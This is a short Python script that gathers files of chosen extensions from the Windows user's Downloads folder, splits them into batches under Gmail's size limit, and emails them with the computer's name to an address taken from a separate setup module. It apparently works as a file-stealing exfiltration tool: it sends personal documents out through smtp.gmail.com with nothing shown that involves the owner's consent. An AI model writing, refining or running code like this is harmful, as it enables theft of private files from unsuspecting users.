import os
import sys
import smtplib
import time
from setup import *
from email.message import EmailMessage

def send_files_email(email_address, email_password, to_address, files):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = email_address
    msg["To"] = to_address
    msg.set_content(f"{os.getenv("COMPUTERNAME")}")

    for file_name in files:
        with open(file_name, "rb") as f:
            file_data = f.read()
            _, ext = os.path.splitext(file_name)
            ext = ext.lower()

            if ext == ".pdf":
                maintype, subtype = "application", "pdf"
            else:
                maintype, subtype = "application", "octet-stream"

            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(email_address, email_password)
            smtp.send_message(msg)
        print("Sended")
    except smtplib.SMTPException:
        print("Smthing is wrong")

usernm = os.getlogin()
if os.path.exists(f"C:\\Users\\{usernm}\\Downloads"):
    os.chdir(f"C:\\Users\\{usernm}\\Downloads")
    print(f"found")
else:
    print(f"not found")
    time.sleep(3)
    exit(-1)

max_size = 17_825_000
files = []

for name in os.listdir():
    if os.path.isfile(name):
        _, ext = os.path.splitext(name)
        if ext.lower() in allowed_extensions:
            files.append(name)
for i in range(0, len(files)):
    print(files[i])

curr_files = []
curr_size = 0

for file in files:
    file_size = os.path.getsize(file)
    if file_size > max_size:
        print(f"{file} too big, skip")
        continue
    if curr_size + file_size > max_size:
        send_files_email(email_address, email_password, to_address, curr_files)
        curr_files = []
        curr_size = 0

    curr_files.append(file)
    curr_size += file_size

if curr_files:
    send_files_email(email_address, email_password, to_address, curr_files)

